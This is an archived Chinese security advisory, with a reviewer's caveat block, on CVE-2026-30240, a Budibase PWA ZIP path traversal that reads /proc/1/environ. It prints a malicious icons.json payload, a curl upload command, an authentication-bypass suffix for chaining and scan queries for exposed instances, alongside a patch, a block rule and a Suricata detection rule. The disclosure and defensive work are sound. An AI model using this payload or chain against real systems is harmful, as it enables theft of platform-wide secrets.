---
cve: "CVE-2026-30240"
source: "gelusus/wxvl 公众号漏洞文库"
product: "Budibase PWA ZIP icon path traversal"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2026-30240"
referenced_identifiers: "CVE-2026-31816; CVE-2026-25737; CVE-2026-27702"
identifier_role: "primary"
identifier_status: "unknown"
title: "Budibase 低代码平台高危漏洞预警：一次请求即可窃取平台全部密钥"
prerequisites: "来源所述条件，未列明部分仍待核：Claims<=3.31.5; timeline says no patch March9 yet recommendations3.31.8; builder access unless separately chained auth bypass"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-a49630f4df3fc23775d31978"
entity_id: "ve-a49630f4df3fc23775d31978"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Claims&lt;=3.31.5; timeline says no patch March9 yet recommendations3.31.8; builder access unless separately chained auth bypass

代码与实验材料：Source sink, icons.json, upload request, mitigation snippets; full cloud scale and19 secrets claims attributed but not corroborated; signed URL retrieval not literally same HTTP request

来源证据范围：Two official GHSAs, CIRCL and secondary article linked

- **事实待核（1）**：Fix3.31.8 needs dated source reconciliation with None in timeline。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（2）**：Overcompressed request count and no-extra-conditions claim despite builder/path/access requirements；依据：仅需一次HTTP调用 versus 通过签名URL取回。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **凭据与会话边界（3）**：Path prefix patch does not discuss symlinks; IDS '..' in compressed ZIP not reliable or specific; credential rotation must consider encryption-key migration。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

#  Budibase 低代码平台高危漏洞预警：一次请求即可窃取平台全部密钥  
原创 CVE-SEC
                    CVE-SEC  CVE-SEC   2026-03-10 04:00  
  
# Budibase 低代码平台高危漏洞预警：一次请求即可窃取平台全部密钥  
  
CVE-2026-30240 | CVSS 9.6（Critical）| 影响版本：Budibase <= 3.31.5  
  
近日，安全研究人员 Abdulrahman Albatel 和 Abdullah Alrasheed 在 Budibase 开源低代码平台中发现并披露了一个路径遍历漏洞，编号 CVE-2026-30240，CVSS 评分 9.6，达到严重级别。  
  
该漏洞允许持有 builder 权限（平台对受邀用户的默认角色）的攻击者，通过上传一个构造好的 ZIP 文件，使服务器读取任意文件系统路径上的文件，并将内容写入对象存储供攻击者取回。  
  
研究人员在 Budibase Cloud 生产环境（版本 3.31.5）上的实证测试结果显示，单次请求成功读取 162 个环境变量，涵盖 JWT 签名密钥、CouchDB 管理员凭据、AWS IAM 密钥、CloudFront RSA 私钥和数据加密密钥等 19 项关键凭据，理论上可横向影响平台上 2,519 个以上的租户和 249,478 个以上的应用。  
## 关于 Budibase  
  
Budibase 由 Budibase Ltd. 于 2019 年创立，是一款面向开发者和 IT 团队的开源低代码平台，用于快速构建内部管理工具、数据仪表盘和工作流自动化应用。平台支持连接 PostgreSQL、MySQL、MongoDB、REST API 等多种数据源，并支持 Docker、Kubernetes 等自托管方式及官方托管服务 Budibase Cloud。其 Progressive Web App（PWA）功能输出模块正是本次漏洞的所在位置。  
## 漏洞根因  
  
漏洞位于服务端文件 packages/server/src/api/controllers/static/index.ts  
 的 processPWAZip  
 函数（第 181-256 行），对应 API 端点为：  
```
POST /api/pwa/process-zip

```  
  
该端点用于接收用户上传的 PWA ZIP 归档，服务端解压后读取其中的 icons.json  
 文件，将其中每个图标的 src  
 路径与临时解压目录（baseDir）拼接，再将文件内容上传至对象存储。问题出在路径拼接这一步：  
```
const result = await objectStore.upload({
  bucket: ObjectStoreBuckets.APPS,
  filename: key,
  path: join(baseDir, icon.src),  // icon.src 来自用户可控的 icons.json，未经过滤
  type: mimeType,
})

```  
  
Node.js 的 path.join()  
 会直接处理 ../  
 相对跳转，并不限制路径范围。代码未在拼接后验证最终路径是否仍位于 baseDir  
 内，导致攻击者只需在 icon.src  
 中填写路径穿越序列，即可使服务器读取任意文件：  
```
path.join("/tmp/pwa-123", "../../../../proc/1/environ")
// 解析结果：/proc/1/environ

```  
  
简而言之，一个本应只读取 ZIP 包内图标文件的函数，因为缺少一行范围检查，变成了任意文件读取工具，且读取结果会自动通过对象存储提供给攻击者。  
## 攻击过程  
  
攻击者首先构造一个包含恶意 icons.json  
 的 ZIP 文件：  
```
{
  "icons": [
    {
      "src": "../../../../proc/1/environ",
      "sizes": "192x192",
      "type": "image/png"
    }
  ]
}

```  
  
随后以 builder 身份将该 ZIP 上传到目标实例：  
```
curl -X POST https://target.budibase.app/api/pwa/process-zip \
  -H "Authorization: Bearer <builder_token>" \
  -F "file=@payload.zip"

```  
  
服务端处理后，/proc/1/environ  
（进程 1 的全部环境变量）的内容会被写入对象存储，攻击者通过签名 URL 取回即可。  
  
整个过程从发送请求到获取数据，仅需一次 HTTP 调用，无需任何额外的漏洞链或特殊条件。  
## 获取密钥后能做什么  
  
官方 Advisory 原文的表述是：  
> "This results in complete platform compromise as all cryptographic secrets and service credentials are exfiltrated in a single request."  
  
  
具体而言，泄露的 19 项关键凭据可用于：  
- 利用 JWT_SECRET 伪造任意用户身份令牌，接管平台上任意账号（含管理员）  
  
- 利用 CouchDB 管理员凭据直接对全部租户数据库执行读写操作  
  
- 利用 API_ENCRYPTION_KEY 解密所有数据源存储的密码  
  
- 利用 AWS IAM 密钥访问云存储资源  
  
- 利用 CloudFront RSA 私钥签发任意 CDN 访问 URL  
  
在 Budibase Cloud 的多租户架构下，所有租户共享同一套环境变量，单个 builder 账号的利用行为可波及平台全部用户数据，平台层面的横向移动无需额外步骤。  
## 同批次相关漏洞  
  
本次同日披露的还有另外两个 Budibase 漏洞，均由同一研究团队发现：  
  
CVE-2026-31816（CVSS 9.1，未授权 API 绕过）：authorized()  
 中间件中 isWebhookEndpoint()  
 函数使用了未锚定的正则匹配请求 URL，攻击者在任意请求后附加 ?/webhooks/trigger  
 即可完全绕过认证、授权和 CSRF 检查，无需任何账号。  
  
CVE-2026-25737（CVSS 8.9，任意文件上传绕过）：客户端文件扩展名校验可被绕过，允许上传任意类型文件。  
  
值得注意的是，CVE-2026-31816 与 CVE-2026-30240 形成联动：前者无需认证即可调用任意 API，后者利用时需要 builder 身份认证。若两个漏洞同时存在，攻击者无需账号即可触发路径遍历，利用门槛进一步降低。  
  
此外，同一研究团队更早（2026年2月25日）披露的 CVE-2026-27702（Budibase Cloud 端 eval() RCE，CVSS 9.9）已在版本 3.30.4 中修复。  
## 漏洞时间线  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;"><section><span leaf="">日期</span></section></th><th style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;"><section><span leaf="">事件</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">2026-03-04</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">研究人员在 Budibase Cloud 生产环境完成实证测试，确认可提取 162 个环境变量</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">2026-03-09</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">CVE-2026-30240、CVE-2026-31816、CVE-2026-25737 同日公开披露</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">2026-03-09</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">官方 Advisory 发布时修复版本标注为 None，即披露时无可用补丁</span></section></td></tr></tbody></table>## 修复方案  
  
安全的修复方式需要在 path.join()  
 拼接路径后，验证最终路径是否仍在 baseDir  
 范围内：  
```
const resolvedPath = path.resolve(baseDir, icon.src)
const normalizedBase = path.resolve(baseDir) + path.sep

if (!resolvedPath.startsWith(normalizedBase)) {
  throw new Error("Path traversal detected: icon src is outside of base directory")
}

```  
  
根本原则是：任何涉及用户可控路径输入的场景，都不应直接使用 path.join()  
，而应结合 path.resolve()  
 和路径前缀验证，确保最终访问路径不超出预期范围。  
## 受影响资产排查  
  
可通过以下资产测绘平台语法定位全球暴露的 Budibase 实例：  
- FOFA：app="Budibase"  
 或 title="Budibase"  
  
- ZoomEye：app:"Budibase"  
  
- Shodan：http.title:"Budibase"  
  
自托管实例默认监听 10000 端口。建议排查实例版本，确认是否在受影响范围内。  
## 防护建议  
  
按优先级排序：  
  
第一，立即升级 Budibase 至已修复版本（3.31.8 或更高）。  
  
第二，若无法立即升级，在反向代理或 WAF 层屏蔽 /api/pwa/process-zip  
 端点对外网的访问：  
```
location /api/pwa/process-zip {
    allow 10.0.0.0/8;
    allow 172.16.0.0/12;
    allow 192.168.0.0/16;
    deny all;
}

```  
  
第三，若怀疑实例已遭利用，立即轮换以下凭据（按优先级）：JWT_SECRET、CouchDB 管理员密码、API_ENCRYPTION_KEY、对象存储访问密钥，以及所有通过环境变量传入的第三方 API Key。  
  
第四，审查 builder 权限账号列表，移除不必要的账号，收紧账号邀请策略。  
  
第五，在 SIEM 或 IDS 平台上部署以下检测规则，监测 POST 方法访问 /api/pwa/process-zip  
 且上传内容包含 ../  
 路径序列的请求：  
```
alert http any any -> $HTTP_SERVERS any (
  msg:"CVE-2026-30240 Budibase PWA ZIP Path Traversal Attempt";
  flow:established,to_server;
  http.method; content:"POST";
  http.uri; content:"/api/pwa/process-zip";
  file.data; content:"..";
  sid:2026302401;
  rev:1;
)

```  
## 参考资料  
- GitHub Security Advisory GHSA-pqcr-jmfv-c9cp：https://github.com/Budibase/budibase/security/advisories/GHSA-pqcr-jmfv-c9cp  
  
- CVE-2026-30240 漏洞详情（CIRCL）：https://vulnerability.circl.lu/vuln/cve-2026-30240  
  
- TheHackerWire 分析文章：https://www.thehackerwire.com/budibase-path-traversal-cve-2026-30240-exfiltrates-secrets-critical-risk/  
  
- CVE-2026-31816 Advisory：https://github.com/Budibase/budibase/security/advisories/GHSA-gw94-hprh-4wj8  
  
- Budibase GitHub 仓库：https://github.com/Budibase/budibase  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
